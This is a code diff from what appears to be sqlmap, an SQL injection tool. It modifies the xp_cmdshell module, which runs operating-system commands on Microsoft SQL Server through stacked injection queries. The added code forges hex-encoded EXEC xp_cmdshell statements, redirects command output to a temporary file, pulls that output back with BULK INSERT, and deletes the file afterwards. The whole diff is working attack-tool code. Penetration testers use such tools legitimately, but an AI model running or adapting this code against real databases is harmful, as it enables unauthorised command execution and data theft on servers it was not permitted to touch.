@@ -148,12 +148,18 @@ class xp_cmdshell:
             self.xpCmdshellExecCmd(cmd)
 
     def xpCmdshellForgeCmd(self, cmd, insertIntoTable=None):
+        if conf.dCred:
+            self.tmpFile = "%s/tmpc%s.txt" % (conf.tmpPath, randomStr(lowercase=True))
+            cmd = "%s > \"%s\"" % (cmd, self.tmpFile)
+
         self.__randStr = randomStr(lowercase=True)
         self.__cmd = "0x%s" % hexencode(cmd)
         self.__forgedCmd = "DECLARE @%s VARCHAR(8000);" % self.__randStr
         self.__forgedCmd += "SET @%s=%s;" % (self.__randStr, self.__cmd)
-        if insertIntoTable:
+
+        if insertIntoTable and not conf.dCred:
             self.__forgedCmd += "INSERT INTO %s " % insertIntoTable
+
         self.__forgedCmd += "EXEC %s @%s" % (self.xpCmdshellStr, self.__randStr)
 
         return agent.runAsDBMSUser(self.__forgedCmd)
@@ -178,6 +184,11 @@ class xp_cmdshell:
                 output = new_output
         else:
             inject.goStacked(self.xpCmdshellForgeCmd(cmd, self.cmdTblName))
+
+            if conf.dCred:
+                inject.goStacked("BULK INSERT %s FROM '%s' WITH (CODEPAGE='RAW', FIELDTERMINATOR='%s', ROWTERMINATOR='%s')" % (self.cmdTblName, self.tmpFile, randomStr(10), randomStr(10)))
+                self.delRemoteFile(self.tmpFile)
+
             query = "SELECT %s FROM %s" % (self.tblField, self.cmdTblName)
 
             if conf.direct or any(isTechniqueAvailable(_) for _ in (PAYLOAD.TECHNIQUE.UNION, PAYLOAD.TECHNIQUE.ERROR)):
